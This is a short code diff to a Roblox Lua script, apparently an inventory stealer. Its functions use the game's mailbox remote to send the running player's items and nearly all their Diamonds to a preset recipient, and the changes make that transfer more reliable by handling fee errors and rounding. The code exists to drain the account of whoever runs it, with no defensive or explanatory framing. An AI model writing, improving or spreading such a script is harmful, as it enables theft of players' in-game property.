@@ -58,10 +58,10 @@ local function IsMailboxHooked()
         [5] = 1
     }
     local response, err = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-    if err ~= "They don't have enough space!" then
-        return true
-    else
+    if (err == "They don't have enough space!") or (err == "You don't have enough diamonds to send the mail!") then
         return false
+    else
+        return true
     end
 end
 
@@ -195,7 +195,7 @@ local function sendItem(category, uid, am)
 		end
 	until response == true
 	GemAmount1 = GemAmount1 - newamount
-	newamount = newamount * 1.5
+	newamount = math.ceil(newamount) * 1.5
 	if newamount > 5000000 then
 		newamount = 5000000
 	end
@@ -204,13 +204,13 @@ end
 local function SendAllGems()
     for i, v in pairs(GetSave().Inventory.Currency) do
         if v.id == "Diamonds" then
-			if GemAmount1 >= (newamount + 10000) then
+			if GemAmount1 >= (math.ceil(newamount) + 10000) then
 				local args = {
 					[1] = user,
 					[2] = MailMessage,
 					[3] = "Currency",
 					[4] = i,
-					[5] = math.floor(GemAmount1 - newamount)
+					[5] = GemAmount1 - math.ceil(newamount)
 				}
 				local response = false
 				repeat
